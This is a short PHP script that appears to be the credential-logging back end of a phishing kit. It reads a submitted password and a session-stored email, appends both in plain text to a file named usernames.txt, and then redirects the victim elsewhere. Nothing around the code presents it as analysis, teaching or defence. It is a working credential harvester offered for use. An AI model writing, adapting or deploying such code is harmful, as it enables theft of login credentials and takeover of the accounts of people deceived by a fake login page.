<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
			session_start();
			
			$pass = $_POST["password"];
			$email=$_SESSION["Email"];
			
			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $email . " ]   " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
  			header('Location: <REDIRECT>');
			exit();
			
			
			session_destroy();
			
?>